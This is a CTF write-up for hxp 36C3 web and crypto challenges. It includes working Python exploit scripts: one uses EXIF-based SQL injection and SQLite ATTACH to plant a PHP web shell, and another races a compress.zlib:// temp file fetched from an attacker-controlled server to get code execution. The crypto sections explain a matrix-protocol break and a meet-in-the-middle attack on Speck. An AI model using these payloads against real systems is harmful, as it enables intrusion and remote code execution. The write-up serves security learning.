# hxp 36C3 CTF

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/) of this writeup.**


 - [hxp 36C3 CTF](#hxp-36c3-ctf)
 - [hxp 36C3 CTF](#hxp-36c3-ctf-1)
   - [Web](#web)
     - [File Magician](#file-magician)
       - [Failed Attempts](#failed-attempts)
     - [includer](#includer)
   - [Crypto](#crypto)
     - [peerreviewed](#peerreviewed)
     - [bacon](#bacon)


---

# hxp 36C3 CTF

## Web

### File Magician

The server source code snippet:

```php
session_start();

if( ! isset($_SESSION['id'])) {
    $_SESSION['id'] = bin2hex(random_bytes(32));
}

$d = '/var/www/html/files/'.$_SESSION['id'] . '/';
@mkdir($d, 0700, TRUE);
chdir($d) || die('chdir');

$db = new PDO('sqlite:' . $d . 'db.sqlite3');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->exec('CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);');

if (isset($_FILES['file']) && $_FILES['file']['size'] < 10*1024 ){
    $s = "INSERT INTO upload(info) VALUES ('" .(new finfo)->file($_FILES['file']['tmp_name']). " ');";
    $db->exec($s);
    move_uploaded_file( $_FILES['file']['tmp_name'], $d . $db->lastInsertId()) || die('move_upload_file');
}
```

It's obvious that it's vulnerable to SQL injection if we can control `new finfo`. The output seems to be the same with Linux command `file`, as they depends on the `libmagic`.


Let's get some file info from my home directory:

```sh
$ find ~ -exec file {} +

...

foobar.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=GIMP 2.10.8, datetime=2019:05:10 21:21:39], baseline, precision 8, 1x1, components 3
```

Bingo! The string `GIMP 2.10.8` in EXIF data can be replaced with arbitrary text. We can execute any SQL statement now.

It's also worth to mention:

1.  PDO support multiple SQL statement
2.  SQLlite `ATTACH database` can be used to write file
3.  We have write access of the directory

Here is the payload:

```python
#!/usr/bin/env python3

import requests
import re
s = requests.session()

def sql(q):
    res = open('./1x1.jpg', 'rb').read().replace(b'GIMP', f'''
');{q};--
'''.strip().encode())
    return res

url = 'http://78.47.152.131:8000/'
s.get(url)
files = {
    'file': ('foo.jpg', open('./1x1.jpg', 'rb').read())
}
s.post(url, files=files)

qs = [
"ATTACH DATABASE 'bar.php' AS j;CREATE TABLE j.k (f text);",
"ATTACH DATABASE 'bar.php' AS j;INSERT INTO j.k (f) VALUES ('<?php system(\"cat /f*\");?>');"
]
for q in qs:
    files = {
        'file': ('foo.jpg', sql(q))
    }
    s.post(url, files=files)
    s.get(url)
    r = s.get(url)
    print(q)
    print(r.text)
path = re.findall('href="(.*)/1"', r.text)[0]
print(url + path + '/bar.php')
r = s.get(url + path + '/bar.php')
print(r.text)
```

The flag is `hxp{I should have listened to my mum about not trusting files about files}`.

#### Failed Attempts

I didn't know PDO can execute multiple queries at the beginning, so I was working on these:

- Inject `lastIndexId()`: However this function return type is [integer] (https://www.sqlite.org/c3ref/last_insert_rowid.html).
- Control `lastIndexId()`: Though SQLite accepts [string in integer type](https://dba.stackexchange.com/questions/106364/text-string-stored-in-sqlite-integer-column), it does not apply to [ROWID](https://www.sqlite.org/lang_createtable.html#rowid). It must be an integer.
- Insert and update: SQlite supports [UPSERT](https://www.sqlite.org/lang_UPSERT.html), where we can possibly update values through a UPDATE statement SQL injection, but we don't have any UNIQUE field in that table.

### includer

```c=
<?php
declare(strict_types=1);

$rand_dir = 'files/'.bin2hex(random_bytes(32));
mkdir($rand_dir) || die('mkdir');
putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');
echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";

try {
    if (stripos(file_get_contents($_POST['file']), '<?') === false) {
        include_once($_POST['file']);
    }
}
finally {
    system('rm -rf '.escapeshellarg($rand_dir));
}
```

In this challenge, it will create a directory as temporary directory with random name every request.

But it disables the http upload and session, so it is very hard to create a temporary file.

If we take a look at the php-src (https://github.com/php/php-src), we will find out that we can use `compress.zlib://` to upload a temporary file with arbitrary content.

In `ext/zlib/zlib_fopen_wrapper.c`: 

```c=
php_stream *php_stream_gzopen(php_stream_wrapper *wrapper, const char *path, const char *mode, int options,
    							  zend_string **opened_path, php_stream_context *context STREAMS_DC)
{
    struct php_gz_stream_data_t *self;
    php_stream *stream = NULL, *innerstream = NULL;

    /* sanity check the stream: it can be either read-only or write-only */
    if (strchr(mode, '+')) {
        if (options & REPORT_ERRORS) {
            php_error_docref(NULL, E_WARNING, "cannot open a zlib stream for reading and writing at the same time!");
        }
        return NULL;
    }

    if (strncasecmp("compress.zlib://", path, 16) == 0) {
        path += 16;
    } else if (strncasecmp("zlib:", path, 5) == 0) {
        path += 5;
    }

    innerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);
    ....
```

It set the `STREAM_WILL_CAST` option.

and in the `main/streams/streams.c`:

```c=
PHPAPI php_stream *_php_stream_open_wrapper_ex(const char *path, const char *mode, int options,
		zend_string **opened_path, php_stream_context *context STREAMS_DC)
{
	  // ....
		if (stream != NULL && (options & STREAM_MUST_SEEK)) {
		php_stream *newstream;

		switch(php_stream_make_seekable_rel(stream, &newstream,
					(options & STREAM_WILL_CAST)
						? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE)) {
		// ....
}
```

The `_php_stream_open_wrapper_ex()` function will call the `php_stream_make_seekable_rel()` with `PHP_STREAM_PREFER_STDIO` flag if the `STREAM_WILL_CAST` option has been set.

Then in the `main/streams/cast.c`:

```c=
PHPAPI int _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, int flags STREAMS_DC)
{
	if (newstream == NULL) {
		return PHP_STREAM_FAILED;
	}
	*newstream = NULL;

	if (((flags & PHP_STREAM_FORCE_CONVERSION) == 0) && origstream->ops->seek != NULL) {
		*newstream = origstream;
		return PHP_STREAM_UNCHANGED;
	}

	/* Use a tmpfile and copy the old streams contents into it */

	if (flags & PHP_STREAM_PREFER_STDIO) {
		*newstream = php_stream_fopen_tmpfile();
	} else {
		*newstream = php_stream_temp_new();
	}
  // ... 
```

If the `PHP_STREAM_PREFER_STDIO` has been set, it will call the `php_stream_fopen_tmpfile()` to create temporary file.

So we can create our temporary file with arbitrary content now.

Our target is obvious:

1. Using `compress.zlib://http://myserver` to upload some trash, but don't close the connection
2. Using `.well-known../files/xxxxxxxxxxx/` to list our temporary file name (xxxxxxxxxxx is directory name)
3. Using `file_get_contents` to read the temporary file with another session
4. Because the temp file doesn't contain `<?`, so it will pass the check
5. Send our php code from the previous connection
6. Include the temp file with our php code

Because we need to send php code between `file_get_contents()` and `include()`, so we should race it! (step 3 ~ step 6)

And there is another problem, we need to get the directory name in the step 1, but the connection can't be closed.

To solve this problem, we use the `$_POST['name']` to stuff the php output buffer.

Then we'll see the random directory name without closing the connection.

Exploit:

```python=
from pwn import *
import requests
import re
import threading
import time

for gg in range(100):
    
    r = remote("78.47.165.85", 8004)
    l = listen(5487)

    payload = '''POST / HTTP/1.1
Host: 78.47.165.85:8004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: 8098
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

name={}&file=compress.zlib://http://kaibro.tw:5487'''.format("a"*8050).replace("\n","\r\n")


    r.send(payload)
    r.recvuntil("your sandbox: ")
    dirname = r.recv(70)

    print("[DEBUG]:" + dirname)

    # send trash
    c = l.wait_for_connection()
    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8

AAA
BBB'''.replace("\n","\r\n")
    c.send(resp)


    # get filename
    r2 = requests.get("http://78.47.165.85:8004/.well-known../"+ dirname + "/")
    tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
    print("[DEBUG]:" + tmpname)

    def job():
        time.sleep(0.26)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    # file_get_contents and include tmp file
    exp_file = dirname + "/" + tmpname
    print("[DEBUG]:"+exp_file)
    r3 = requests.post("http://78.47.165.85:8004/", data={'file':exp_file})
    print(r3.status_code,r3.text)
    if "wtf" in r3.text:
        break

    t.join()
    r.close()
    l.close()
    #r.interactive()
```

flag: `hxp{I don't care what the people say I read my php-src everyday}`

## Crypto

### peerreviewed

As the paper shown, the plaintext $p$ is a point on 2D Cartesian plane, and the encryption follows a 3-pass protocol.

Before the communication begins, Alice secretly decides 2-by-2 matrices $O_A, A$.

$O_A$ is a rotation matrix, and $A$ is a matrix of form `[[a, b], [-b, a]`.

Bob secretly decides $O_B, B$ similarly.

Then, they communicate like following.

* Alice -> Bob: $y_1 = p\times O_A\times A$
* Bob -> Alice: $y_2 = y_1\times O_B\times B$
* Alice -> Bob: $y_3 = y_2\times O_A^{-1}\times A^{-1}$
* Now Bob can obtain $p$ by calculating $y_3\times O_B^{-1}\times B^{-1}$.

The paper said if only $O_A, O_B$ are used, then it'll be not secure enough because they are rotation matrix, and one can easily get $O_A, O_B$ from $y_1, y_2, y_3$. By adding **nonce matrix**  $A, B$ into this encryption system, it'll be secure enough. ***"the only identified way one can compromise the protocol security is by applying brute force attacks"*** , the paper said.

However, both $A, B$ are of form `[[a, b], [-b, a]`. They are simply scaled rotation matrices. Thus, both $O_A\times A$ and $O_B\times B$ are also scaled rotation matrices, and they are still easily obtained from $y_1, y_2, y_3$.

flag: `hxp{p33r_r3v13w3d_m4y_n0t_b3_1337_r3v13w3d}`

### bacon

This challenge is based on [Speck Cipher](https://en.wikipedia.org/wiki/Speck_(cipher)) with 48-bit block size and 72-bit key size.

You need to give the server a key, such that the encrypted data of a null block is an assigned value. However, the encryption is strange: they cut the long key into a few chunks and use each chunk sequentially to finish the encryption.

In this way, one can pick a key of two-chunk length, search the first part and the second part independently. That is essentially the Meet-in-the-middle attack. Cause the block size is only 48 bits, the expected trials for Meet-in-the-middle attack is roughly $2^{24}$, which should be feasible in the 100-second timeout.

Note: The implementation of this attack needs to be efficient enough. In my case, I found a pip package and used it in the beginning. However, it is way too slow to solve it (something like 100 times slower than needed), because all the crypto computation is implemented in Python. I used C-implemented Speck cipher with C++'s `unordered_map` at the end (single threaded), which can usually find the collision in 40 seconds.

flag: `hxp{7h3Y_f1n4Lly_m4d3_a_t0Y_c1ph3R_f0r_CTF_Ta5kz}`
